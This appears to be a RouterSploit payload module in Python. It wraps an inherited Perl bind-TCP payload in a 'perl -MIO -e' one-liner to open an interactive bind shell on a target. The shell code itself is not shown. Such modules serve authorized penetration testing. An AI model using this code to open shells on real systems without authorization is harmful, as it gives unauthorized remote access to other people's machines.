from routersploit.core.exploit import *
from routersploit.modules.payloads.perl.bind_tcp import Exploit as PerlBindTCP


class Exploit(PerlBindTCP):
    __info__ = {
        "name": "Perl Bind TCP One-Liner",
        "description": "Creates interactive tcp bind shell by using perl one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    cmd = OptString("perl", "Perl binary")

    def generate(self):
        payload = super(Exploit, self).generate()

        cmd = "{} -MIO -e '{}'".format(self.cmd, payload)
        return cmd
